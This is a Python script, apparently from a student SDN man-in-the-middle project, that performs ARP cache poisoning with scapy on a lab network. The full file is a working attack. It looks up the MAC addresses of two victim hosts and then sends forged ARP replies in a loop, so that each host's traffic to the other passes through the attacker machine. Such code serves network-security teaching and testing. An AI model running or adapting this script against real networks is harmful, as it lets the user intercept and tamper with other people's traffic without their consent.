#!/usr/bin/env python3
# ARP spoofing / cache poisoning attack - SDN MitM project (Attack 1).
# Run this on the attacker host (atk). It tells h1 and h2 that each
# other's IP is at the attacker's MAC, so their traffic to each other
# passes through the attacker (man-in-the-middle).

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)   # silence scapy warnings

from scapy.all import Ether, ARP, srp, sendp
import time

# the two victims we want to sit between
victim1_ip = "10.0.10.11"   # h1
victim2_ip = "10.0.10.12"   # h2


def get_mac(ip):
    # ask "who has this IP?" and read the MAC from the reply
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=3, verbose=0)
    for sent, reply in ans:
        return reply.hwsrc
    return None


def poison(target_ip, target_mac, spoof_ip):
    # full frame: Ethernet to the victim + ARP reply "spoof_ip is at my mac"
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip,
                                      hwdst=target_mac, psrc=spoof_ip)
    sendp(pkt, verbose=0)


mac1 = get_mac(victim1_ip)
mac2 = get_mac(victim2_ip)
print("h1 mac:", mac1)
print("h2 mac:", mac2)

if not mac1 or not mac2:
    print("Could not find one of the victims. Are they up? Try pingall first.")
    raise SystemExit

print("Poisoning both victims. Press Ctrl+C to stop.")
try:
    while True:
        poison(victim1_ip, mac1, victim2_ip)   # h1 now thinks I am h2
        poison(victim2_ip, mac2, victim1_ip)   # h2 now thinks I am h1
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopped.")
